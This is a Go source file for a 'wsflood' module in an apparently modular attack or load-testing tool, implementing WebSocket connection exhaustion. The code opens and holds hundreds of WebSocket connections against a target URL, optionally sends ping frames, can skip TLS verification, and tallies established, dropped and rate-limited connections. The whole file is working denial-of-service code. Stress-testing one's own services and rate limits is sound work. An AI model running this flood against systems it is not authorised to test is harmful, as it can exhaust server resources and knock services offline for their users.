package wsflood

import (
	"bufio"
	"context"
	"crypto/rand"
	"crypto/tls"
	"encoding/base64"
	"errors"
	"flag"
	"fmt"
	"net"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/conantorreswf/limithit/internal/attacks"
	"github.com/conantorreswf/limithit/internal/metrics"
)

func init() {
	attacks.Register("wsflood", func() attacks.Attack { return &WSFlood{} })
}

type WSFlood struct {
	connections int
	hold        int
	messageRate int
	dialTimeout int
	insecure    bool
}

func (w *WSFlood) Name() string     { return "wsflood" }
func (w *WSFlood) Synopsis() string { return "WebSocket connection exhaustion (open and hold)" }

func (w *WSFlood) FormFields() []attacks.FormField {
	url := ""
	connections := "200"
	hold := "60"
	messageRate := "0"
	dialTimeout := "5"
	insecure := "false"
	return []attacks.FormField{
		{Flag: "url", Label: "Target URL", Help: "Use http:// or ws:// for plain WS; https:// or wss:// for TLS", Kind: attacks.FieldURL, Default: "", Value: &url},
		{Flag: "connections", Label: "WebSocket connections", Help: "Connections to open and hold", Kind: attacks.FieldInt, Default: "200", Validate: attacks.ValidatePosInt, Value: &connections},
		{Flag: "hold", Label: "Hold duration (s)", Kind: attacks.FieldInt, Default: "60", Validate: attacks.ValidatePosInt, Value: &hold},
		{Flag: "message-rate", Label: "Ping messages per second", Help: "0 = silent hold", Kind: attacks.FieldInt, Default: "0", Validate: attacks.ValidateNonNegInt, Value: &messageRate},
		{Flag: "dial-timeout", Label: "Dial timeout (s)", Kind: attacks.FieldInt, Default: "5", Validate: attacks.ValidatePosInt, Value: &dialTimeout},
		{Flag: "insecure", Label: "Skip TLS verification", Kind: attacks.FieldBool, Default: "false", Value: &insecure},
	}
}

func (w *WSFlood) Flags(fs *flag.FlagSet) {
	fs.IntVar(&w.connections, "connections", 200, "WebSocket connections to open and hold")
	fs.IntVar(&w.hold, "hold", 60, "seconds to hold each connection open")
	fs.IntVar(&w.messageRate, "message-rate", 0, "ping messages per second (0 = silent hold)")
	fs.IntVar(&w.dialTimeout, "dial-timeout", 5, "dial timeout seconds")
	fs.BoolVar(&w.insecure, "insecure", false, "skip TLS certificate verification")
}

func (w *WSFlood) Validate() error {
	if w.connections < 1 {
		return errors.New("connections must be >= 1")
	}
	return nil
}

func (w *WSFlood) Run(ctx context.Context, base attacks.Base) (attacks.Report, error) {
	u, err := url.Parse(base.URL)
	if err != nil {
		return nil, fmt.Errorf("wsflood: invalid url: %w", err)
	}
	switch u.Scheme {
	case "ws", "http":
		u.Scheme = "ws"
	case "wss", "https":
		u.Scheme = "wss"
	default:
		return nil, fmt.Errorf("wsflood: scheme must be ws/wss/http/https, got %q", u.Scheme)
	}

	opts := runOpts{
		URL:         u,
		Connections: w.connections,
		Hold:        time.Duration(w.hold) * time.Second,
		MessageRate: w.messageRate,
		DialTimeout: time.Duration(w.dialTimeout) * time.Second,
		Insecure:    w.insecure,
	}
	return runWSFlood(ctx, opts)
}

type runOpts struct {
	URL         *url.URL
	Connections int
	Hold        time.Duration
	MessageRate int
	DialTimeout time.Duration
	Insecure    bool
}

func runWSFlood(ctx context.Context, opts runOpts) (*metrics.ConnReport, error) {
	cc := metrics.NewConnCollector()
	start := time.Now()

	var wg sync.WaitGroup
	for i := 0; i < opts.Connections; i++ {
		if ctx.Err() != nil {
			break
		}
		wg.Add(1)
		go func() {
			defer wg.Done()
			holdWS(ctx, opts, cc)
		}()
		// Stagger connection attempts slightly.
		time.Sleep(time.Duration(1e6)) // 1ms
	}
	wg.Wait()
	return cc.Finalize(time.Since(start)), nil
}

func holdWS(ctx context.Context, opts runOpts, cc *metrics.ConnCollector) {
	cc.Attempt()

	host := opts.URL.Host
	if _, _, err := net.SplitHostPort(host); err != nil {
		if opts.URL.Scheme == "wss" {
			host = host + ":443"
		} else {
			host = host + ":80"
		}
	}

	dialer := &net.Dialer{Timeout: opts.DialTimeout}
	var conn net.Conn
	var err error
	if opts.URL.Scheme == "wss" {
		conn, err = tls.DialWithDialer(dialer, "tcp", host, &tls.Config{
			InsecureSkipVerify: opts.Insecure,
			ServerName:         splitHost(host),
		})
	} else {
		conn, err = dialer.DialContext(ctx, "tcp", host)
	}
	if err != nil {
		cc.Error(classifyErr(err))
		return
	}
	defer conn.Close()

	// WebSocket handshake.
	key := wsKey()
	path := opts.URL.RequestURI()
	if path == "" {
		path = "/"
	}
	handshake := fmt.Sprintf(
		"GET %s HTTP/1.1\r\nHost: %s\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: %s\r\nSec-WebSocket-Version: 13\r\n\r\n",
		path, splitHost(host), key,
	)
	_ = conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
	if _, err := conn.Write([]byte(handshake)); err != nil {
		cc.Error("handshake-write:" + classifyErr(err))
		return
	}

	// Read upgrade response.
	_ = conn.SetReadDeadline(time.Now().Add(5 * time.Second))
	br := bufio.NewReader(conn)
	statusLine, err := br.ReadString('\n')
	if err != nil {
		cc.Error("handshake-read:" + classifyErr(err))
		return
	}
	if !strings.Contains(statusLine, "101") {
		// Server rejected the upgrade — drain status line.
		code := "rejected"
		if strings.Contains(statusLine, "429") {
			code = "rejected-429"
		}
		cc.Error(code)
		return
	}
	// Drain remaining headers.
	for {
		_ = conn.SetReadDeadline(time.Now().Add(2 * time.Second))
		line, err := br.ReadString('\n')
		if err != nil || strings.TrimSpace(line) == "" {
			break
		}
	}
	_ = conn.SetDeadline(time.Time{}) // clear deadline

	cc.Established()
	openedAt := time.Now()

	deadline := time.NewTimer(opts.Hold)
	defer deadline.Stop()

	var ticker *time.Ticker
	if opts.MessageRate > 0 {
		ticker = time.NewTicker(time.Second / time.Duration(opts.MessageRate))
		defer ticker.Stop()
	} else {
		ticker = time.NewTicker(24 * time.Hour) // effectively disabled
		defer ticker.Stop()
	}

	for {
		select {
		case <-ctx.Done():
			cc.DroppedClient(time.Since(openedAt))
			return
		case <-deadline.C:
			cc.DroppedClient(time.Since(openedAt))
			return
		case <-ticker.C:
			// Send WebSocket ping frame (opcode 0x9, masked, zero payload).
			ping := wsPingFrame()
			_ = conn.SetWriteDeadline(time.Now().Add(2 * time.Second))
			if _, err := conn.Write(ping); err != nil {
				cc.DroppedByServer(time.Since(openedAt))
				cc.Error("ping-write:" + classifyErr(err))
				return
			}
			cc.AddBytes(int64(len(ping)))
		}
	}
}

func wsKey() string {
	b := make([]byte, 16)
	_, _ = rand.Read(b)
	return base64.StdEncoding.EncodeToString(b)
}

// wsPingFrame returns a masked WebSocket ping frame with no payload.
func wsPingFrame() []byte {
	mask := make([]byte, 4)
	_, _ = rand.Read(mask)
	return []byte{
		0x89, // FIN=1, opcode=9 (ping)
		0x80, // MASK=1, payload len=0
		mask[0], mask[1], mask[2], mask[3],
	}
}

func splitHost(hostport string) string {
	h, _, err := net.SplitHostPort(hostport)
	if err != nil {
		return hostport
	}
	return h
}

func classifyErr(err error) string {
	if err == nil {
		return ""
	}
	var ne net.Error
	if errors.As(err, &ne) && ne.Timeout() {
		return "timeout"
	}
	s := err.Error()
	for _, sub := range []string{"refused", "reset", "broken pipe", "closed"} {
		if strings.Contains(s, sub) {
			return strings.ReplaceAll(sub, " ", "-")
		}
	}
	return "other"
}
